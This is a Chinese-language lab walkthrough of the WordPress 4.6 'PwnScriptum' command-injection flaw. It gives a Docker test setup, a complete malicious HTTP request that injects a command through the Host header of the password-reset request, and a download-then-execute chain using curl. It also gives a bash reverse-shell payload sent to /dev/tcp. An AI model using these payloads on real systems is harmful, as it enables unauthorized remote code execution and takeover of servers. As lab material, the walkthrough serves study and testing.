# Wordpress 4.6 任意命令执行漏洞（PwnScriptum）

## 测试环境

编译及运行测试环境

```plain
docker compose build
docker compose up -d
```

由于Mysql初始化需要一段时间，所以请等待。成功运行后，访问http://your-ip:8080/打开站点，初始化管理员用户名和密码后即可使用（数据库等已经配置好，且不会自动更新）。

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780966241080-a73c30ac-0780-4f63-8c38-42e8b46fe31d.png)

## 测试与EXP使用

发送如下数据包，可见/tmp/success已经成功创建：

```plain
POST /wp-login.php?action=lostpassword HTTP/1.1
Host: target(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}touch${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}success}} null)
Connection: close
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Accept: */*
Content-Length: 56
Content-Type: application/x-www-form-urlencoded

wp-submit=Get+New+Password&redirect_to=&user_login=admin
```

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780966241119-3c83a754-8596-4e10-9050-b4303f03dbd9.png)

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780966241052-c62a00d0-4f4a-43c0-b5df-9d402a8e4b4c.png)

但实际利用起来，还是有一些坑需要踏过。具体的坑有这么几个：

\1.         执行的命令不能包含大量特殊字符，如:、引号等。

\2.         命令会被转换成小写字母

\3.         命令需要使用绝对路径

\4.         需要知道某一个存在的用户的用户名

为了解决这些坑，漏洞作者想出了，利用${substr{0}{1}{$spool_directory}}代替/，用${substr{10}{1}{$tod_log}}代替空格的方法。

但是还是有很多字符不能用，所以我们需要将待执行的命令放到第三方网站中，然后通过curl -o /tmp/rce example.com/shell.sh的方法先将他下载到/tmp目录中，再去执行。

所以，总体来说利用过程如下：

l  编写反弹shell的exp，放到某个网页里。有如下要求：整个url的大写字母会被转换成小写，所以大写小敏感的系统不要使用大写字母做文件路径

¡  访问该网页不能跳转，因为follow跳转的参数是-L（大写）

l  拼接成命令/usr/bin/curl -o/tmp/rce example.com/shell.sh和命令/bin/bash /tmp/rce

l  将上述命令中的空格和/转换成${substr{10}{1}{$tod_log}}和${substr{0}{1}{$spool_directory}}

l  拼接成HTTP包的Host头：target(any -froot@localhost -be ${run{command}} null)

l  依次发送这两个拼接好的数据包

我将上述过程写成[exp脚本](https://github.com/vulhub/vulhub/blob/master/wordpress/pwnscriptum/exploit.py#tdsub)，将脚本中target修改成你的目标，user修改成一个已经存在的用户，shell_url修改成你放置payload的网址。（或直接将target作为第一个参数、shell_url作为第二个参数）

执行即可获得shell：

[example.com/shell.sh的内容为：](https://example.com/shell.sh的内容为：)

```plain
bash -i >& /dev/tcp/your-reverse—shell-ip/9999 0>&1
```

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780966241303-02f6829f-056c-4ecd-9682-8b73b7dcc114.png)

执行即可获得shell：

```plain
python wordpress.py http://192.168.174.128:8080 example.com/shell.sh
```

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780966241211-208e5249-4c98-4e28-af9e-af282fc3868e.png)

监听21端口，接收反弹shell：

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780966242211-b2a18d2e-7828-4d5d-9f1d-b0fa2ff80b2c.png)